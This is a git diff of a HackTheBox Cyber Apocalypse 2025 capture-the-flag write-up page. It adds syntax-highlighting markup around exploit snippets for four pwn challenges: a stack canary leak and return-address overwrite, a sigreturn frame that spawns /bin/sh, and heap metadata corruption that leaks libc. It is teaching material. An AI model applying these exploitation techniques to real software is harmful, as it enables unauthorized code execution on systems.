@@ -11,6 +11,7 @@ permalink: /writeups/HackTheBox-CyberApocalypse2025/
 
 <!-- Link Bootstrap CSS (add this to your <head> if it's not already included) -->
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/themes/prism-tomorrow.min.css" integrity="sha512-kSwGoyIkfz4+hMo5jkJngSByil9jxJPKbweYec/UgS+S1EgE45qm4Gea7Ks2oxQ7qiYyyZRn66A9df2lMtjIsw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 <link rel="stylesheet" href="{{ '/writeups/writeup-page.css' | relative_url }}" />
 
 <section id="back">
@@ -41,19 +42,19 @@ permalink: /writeups/HackTheBox-CyberApocalypse2025/
         <div class="section-content">
             <h2>Initial Analysis</h2>
             <h5>Checksec Findings</h5>
-            <pre><code>checksec --file=quack_quack</code></pre>
+            <pre><code class="language-bash">checksec --file=quack_quack</code></pre>
         <h3>Security Features</h3>
         <ul>
             <li><b><code>No PIE</code>  (Position Independent Executable):</b> This means addresses remain fixed, making it easier to exploit.</li>
             <li><b><code>Stack Canary enabled</code> :</b> We need to bypass it before modifying the return address.</li>
             <li><b><code>NX is enabled</code>:</b> We can't execute shellcode in writable memory, so we need to use a return-to-function exploit.</li>
         </ul>
-<pre><code>RELRO           STACK CANARY      NX            PIE             
+<pre><code class="language-bash">RELRO           STACK CANARY      NX            PIE             
 Full RELRO      Canary found      NX enabled    No PIE</code></pre>
 </div>
         <div class="section-content">
             <h3>Disassembly Analysis:</h3>
-            <pre><code>read(0, buf, 0x66uLL);</code></pre>
+            <pre><code class="language-python">read(0, buf, 0x66uLL);</code></pre>
             <ul>
                 <li>The first <code>read()</code> reads <b>102 bytes (0x66)</b> into <code>buf</code>, but <code>buf</code> is only <b>4x8 = 32 bytes</b> long. This means we can overflow into the canary.</li>
                 <li>The input is checked for the substring <b>"Quack Quack "</b>.</li>
@@ -71,10 +72,10 @@ Full RELRO      Canary found      NX enabled    No PIE</code></pre>
         <div class="section-content">
             <h3>Exploit Development</h3>
             <h4>Step 1: Leak the Canary</h4>
-            <pre><code>payload1 = b"A"*89  # Overwrite up to canary
+            <pre><code class="language-python">payload1 = b"A"*89  # Overwrite up to canary
 payload1 += b"Quack Quack "  # Trigger correct input check</code></pre>
             <h4>Step 2: Overwrite the Return Address</h4>
-            <pre><code>payload2 = b"B"*88  # Fill buffer up to canary
+            <pre><code class="language-python">payload2 = b"B"*88  # Fill buffer up to canary
 payload2 += p64(canary)  # Insert correct canary value
 payload2 += b"B"*8  # Overwrite saved RBP
 payload2 += b"\x7f\x13"  # Address of duck_attack()</code></pre>
@@ -84,14 +85,14 @@ payload2 += b"\x7f\x13"  # Address of duck_attack()</code></pre>
                 <li>Overwrite the return address to <code>duck_attack()</code>.</li>
             </ul>
             <h4>Step 3: Send Payload</h4>
-            <pre><code>io.sendline(payload2)
+            <pre><code class="language-python">io.sendline(payload2)
 io.interactive()</code></pre>
         </div>
         <div class="section-content">
             <div class="h4-wrapper">
         <h4>Complete Exploit:</h4>
              <button class="copy-btn">Copy</button>
-    </div><pre><code>from pwn import *
+    </div><pre><code class="language-python">from pwn import *
 io = process("quack_quack")
 
 # Leak Canary
@@ -130,7 +131,7 @@ io.interactive()</code></pre>
         <div class="section-content">
             <h2>Vulnerability Analysis</h2>
             <h5>Relevant Code Snippet</h5>
-            <pre><code>  v6 = malloc(0x30000uLL);
+            <pre><code class="language-c">  v6 = malloc(0x30000uLL);
   *v6 = 1LL;
   printf("%p", v6); // Leaks the allocated pointer
   
@@ -178,7 +179,7 @@ io.interactive()</code></pre>
         <div class="section-content">
             <h2>Initial Analysis</h2>
             <h5>Checksec Findings</h5>
-            <pre><code>checksec --file=laconic</code></pre>
+            <pre><code class="language-bash">checksec --file=laconic</code></pre>
         <h3>Security Features</h3>
         <ul>
             <li><b><code>No PIE</code>:</b> The binary loads at a fixed address.</li>
@@ -186,7 +187,7 @@ io.interactive()</code></pre>
             <li><b><code>NX Disabled</code>:</b> We can execute shellcode on the stack.</li>
             <li><b><code>No RELRO</code>:</b> The GOT is writable.</li>
         </ul>
-<pre><code>RELRO        STACK CANARY      NX       PIE    
+<pre><code class="language-python">RELRO        STACK CANARY      NX       PIE    
 No RELRO     No Canary        NX Disabled   No PIE</code></pre>
 </div>
         <div class="section-content">
@@ -200,24 +201,24 @@ No RELRO     No Canary        NX Disabled   No PIE</code></pre>
         <div class="section-content">
             <h3>Exploit Development</h3>
             <h4>Step 1: Locate Useful Gadgets</h4>
-            <pre><code>pop_rax = 0x0000000000043018  # Pop value into RAX
+            <pre><code class="language-python">pop_rax = 0x0000000000043018  # Pop value into RAX
 syscall = 0x0000000000043015  # Syscall instruction</code></pre>
             <h4>Step 2: Construct Sigreturn Frame</h4>
-            <pre><code>frame = SigreturnFrame()
+            <pre><code class="language-python">frame = SigreturnFrame()
 frame.rax = 59  # execve syscall
 frame.rdi = bin_sh  # Pointer to /bin/sh
 frame.rsi = 0
 frame.rdx = 0
 frame.rip = syscall</code></pre>
             <h4>Step 3: Send Exploit Payload</h4>
-            <pre><code>payload = b'A'*8 + pack(pop_rax) + pack(15) + pack(syscall) + bytes(frame)
+            <pre><code class="language-python">payload = b'A'*8 + pack(pop_rax) + pack(15) + pack(syscall) + bytes(frame)
 io.sendline(payload)</code></pre>
         </div>
         <div class="section-content">
             <div class="h4-wrapper">
         <h4>Complete Exploit:</h4>
              <button class="copy-btn">Copy</button>
-    </div><pre><code>#!/usr/bin/env python3
+    </div><pre><code class="language-python" >#!/usr/bin/env python3
 from pwn import *
 
 elf = context.binary = ELF('./laconic')
@@ -260,7 +261,7 @@ io.interactive()</code></pre>
             <div class="section-content">
                 <h2>Security Mitigations</h2>
                 <h5>Checksec Findings</h5>
-                <pre><code>RELRO           STACK CANARY      NX           PIE 
+                <pre><code class="language-python">RELRO           STACK CANARY      NX           PIE 
 Partial RELRO   Canary found    NX enabled    No PIE</code></pre>
                 <h3>Security Features</h3>
                 <ul>
@@ -272,13 +273,13 @@ Partial RELRO   Canary found    NX enabled    No PIE</code></pre>
             </div>
             <div class="section-content">
                 <h3>Vulnerability Analysis</h3>
-                <pre><code>if ( (unsigned int)scanf((unsigned int)"%d%*c", (unsigned int)&v18, v6, v7, v8, v9) != 1 )</code></pre>
+                <pre><code class="language-c">if ( (unsigned int)scanf((unsigned int)"%d%*c", (unsigned int)&v18, v6, v7, v8, v9) != 1 )</code></pre>
                 <ul>
                     <li><code>v18</code> is a signed integer, and no check is performed for negative values.</li>
                     <li>Providing a negative index allows memory access outside the intended array.</li>
                     <li>Next, the program executes:</li>
                 </ul>
-                <pre><code>v12 = (_QWORD *)(8LL * v18 + a1);
+                <pre><code class="language-c">v12 = (_QWORD *)(8LL * v18 + a1);
 *v12 = calloc(1LL, 128LL);</code></pre>
                 <ul>
                     <li>With a negative <code>v18</code>, unintended memory regions can be overwritten, including the return pointer.</li>
@@ -306,7 +307,7 @@ Partial RELRO   Canary found    NX enabled    No PIE</code></pre>
                 <<div class="h4-wrapper">
         <h4>Complete Exploit:</h4>
              <button class="copy-btn">Copy</button>
-    </div><pre><code>from pwn import *
+    </div><pre><code class="language-python">from pwn import *
 
 # Connect to remote or local process
 # io = remote("94.237.58.215", 40276)
@@ -363,7 +364,7 @@ io.interactive()</code></pre>
             <div class="section-content">
                 <h2>Initial Analysis</h2>
                 <h5>Checksec Findings</h5>
-                <pre><code>checksec --file=contractor</code></pre>
+                <pre><code class="language-bash">checksec --file=contractor</code></pre>
                 <h3>Security Features</h3>
                 <ul>
                     <li><b><code>Full RELRO</code>:</b> No GOT overwrite possible.</li>
@@ -371,7 +372,7 @@ io.interactive()</code></pre>
                     <li><b><code>NX enabled</code>:</b> No shellcode execution on the stack.</li>
                     <li><b><code>PIE enabled</code>:</b> ASLR is in place.</li>
                 </ul>
-                <pre><code>RELRO           STACK CANARY      NX            PIE             
+                <pre><code class="language-bash">RELRO           STACK CANARY      NX            PIE             
 Full RELRO      Canary found      NX enabled    PIE enabled</code></pre>
             </div>
             <div class="section-content">
@@ -386,22 +387,22 @@ Full RELRO      Canary found      NX enabled    PIE enabled</code></pre>
             <div class="section-content">
                 <h3>Exploit Development</h3>
                 <h4>Step 1: Leak Binary Address</h4>
-                <pre><code>io.sendline(b"N" * 0xF)  # Fill name input
+                <pre><code class="language-python">io.sendline(b"N" * 0xF)  # Fill name input
 io.sendline(b"R" * 0xff)  # Overflow "reason to join" to leak stack address</code></pre>
                 <h4>Step 2: Modify Specialty Pointer</h4>
-                <pre><code>payload = b"\xe8" * 24  # Overflow buffer
+                <pre><code class="language-python">payload = b"\xe8" * 24  # Overflow buffer
 payload += p64(0x1)  # Padding
 payload += b"\xef"  # Overwrite return address
 payload += p64(contract_leak)  # Redirect execution</code></pre>
                 <h4>Step 3: Trigger Execution</h4>
-                <pre><code>io.sendline(payload)
+                <pre><code class="language-python">io.sendline(payload)
 io.sendline(b"Yes")  # Confirm input</code></pre>
             </div>
             <div class="section-content">
                 <div class="h4-wrapper">
         <h4>Complete Exploit:</h4>
              <button class="copy-btn">Copy</button>
-    </div><pre><code>from pwn import *
+    </div><pre><code class="language-python">from pwn import *
 
 while True:
     io = process("./contractor")
@@ -446,14 +447,14 @@ while True:
         <div class="section-content">
             <h2>Initial Analysis</h2>
             <h5>Checksec Findings</h5>
-            <pre><code>checksec --file=strategist</code></pre>
+            <pre><code class="language-bash">checksec --file=strategist</code></pre>
         <h3>Security Features</h3>
         <ul>
             <li><b><code>PIE enabled</code>:</b> ASLR is in place, so we need an information leak.</li>
             <li><b><code>NX enabled</code>:</b> We cannot execute shellcode on the stack.</li>
             <li><b><code>Partial RELRO</code>:</b> Some GOT entries might be writable.</li>
         </ul>
-<pre><code>RELRO           STACK CANARY      NX            PIE             
+<pre><code class="language-bash">RELRO           STACK CANARY      NX            PIE             
 Partial RELRO   No Canary        NX enabled    PIE enabled</code></pre>
 </div>
         <div class="section-content">
@@ -468,26 +469,26 @@ Partial RELRO   No Canary        NX enabled    PIE enabled</code></pre>
         <div class="section-content">
             <h3>Exploit Development</h3>
             <h4>Step 1: Allocate and Free Chunks</h4>
-            <pre><code>create(r, 24, b'A' * 23)  # Chunk A
+            <pre><code class="language-python">create(r, 24, b'A' * 23)  # Chunk A
 create(r, 24, b'B' * 23)  # Chunk B
 create(r, 0x50, b'C' * 24)  # Chunk C
 create(r, 0x50, b'/bin/sh\x00')  # Chunk D
 </code></pre>
             <h4>Step 2: Corrupt Heap Metadata</h4>
-            <pre><code>edit(r, 1, b'B' * 24 + p8(0xc1))  # Overwrite next chunk's size</code></pre>
+            <pre><code class="language-python">edit(r, 1, b'B' * 24 + p8(0xc1))  # Overwrite next chunk's size</code></pre>
             <h4>Step 3: Leak a Libc Address</h4>
-            <pre><code>delete(r, 2)
+            <pre><code class="language-python">delete(r, 2)
 leaked = create(r, 80, b'')
 libc_base = u64(leaked.ljust(8, b'\x00')) - libc.symbols['main_arena']
 print(f"Libc base: {hex(libc_base)}")</code></pre>
             <h4>Step 4: Tcache Poisoning & ROP</h4>
-            <pre><code># Use tcache poisoning to hijack execution and gain shell</code></pre>
+            <pre><code class="language-python"># Use tcache poisoning to hijack execution and gain shell</code></pre>
         </div>
         <div class="section-content">
             <div class="h4-wrapper">
         <h4>Complete Exploit:</h4>
              <button class="copy-btn">Copy</button>
-    </div><pre><code>#!/usr/bin/env python3
+    </div><pre><code class="language-python">#!/usr/bin/env python3
 
 from pwn import *
 
@@ -582,7 +583,10 @@ main()</code></pre>
 
 
 
-
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js" integrity="sha512-UOoJElONeUNzQbbKQbjldDf9MwOHqxNz49NNJJ1d90yp+X9edsHyJoAs6O4K19CZGaIdjI5ohK+O2y5lBTW6uQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-python.min.js" integrity="sha512-3qtI9+9JXi658yli19POddU1RouYtkTEhTHo6X5ilOvMiDfNvo6GIS6k2Ukrsx8MyaKSXeVrnIWeyH8G5EOyIQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-c.min.js" integrity="sha512-EWIJI7uQnA8ClViH2dvhYsNA7PHGSwSg03FAfulqpsFiTPHfhdQIvhkg/l3YpuXOXRF2Dk0NYKIl5zemrl1fmA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-bash.min.js" integrity="sha512-35RBtvuCKWANuRid6RXP2gYm4D5RMieVL/xbp6KiMXlIqgNrI7XRUh9HurE8lKHW4aRpC0TZU3ZfqG8qmQ35zA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
 <!-- Link Bootstrap JS and Popper.js (add these at the end of the <body>) -->
 <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
